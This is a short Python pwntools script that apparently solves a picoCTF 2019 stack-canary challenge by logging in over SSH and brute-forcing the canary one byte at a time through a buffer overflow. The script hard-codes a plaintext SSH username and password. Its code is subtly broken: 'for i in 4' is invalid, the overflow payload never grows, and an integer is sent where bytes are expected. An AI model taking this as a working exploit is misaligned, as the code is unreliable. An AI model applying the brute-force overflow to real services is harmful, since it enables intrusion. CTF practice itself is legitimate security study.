from pwn import *
# brute force to find the canary byte by byte in the local environment
upper_letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
lower_letters = "abcdefghijklmnopqrstuvwxyz"
numbers = "1234567890"
chars = upper_letters+lower_letters+numbers

canary = ""
for i in 4: # 4 is length of the canary
    for c in chars:
        s = ssh(host="2019shell1.picoctf.com", user="Hohenheim10", password="mhw1015sz15,.")
        s.set_working_directory(wd=b"/problems/canary_4_221260def5087dde9326fb0649b434a7")
        p = s.process("./vuln")
        p.sendlineafter("Please enter the length of the entry:\n> ", 1+len(canary)+1)
        # override the ith byte of the canary
        p.sendlineafter("Input> ", "A"+c)
        res = p.recvline()
        print(res)
        # if got "Ok... Now Where's the Flag?" -> correct c
        if "Ok" in res:
            canary+=c
            break
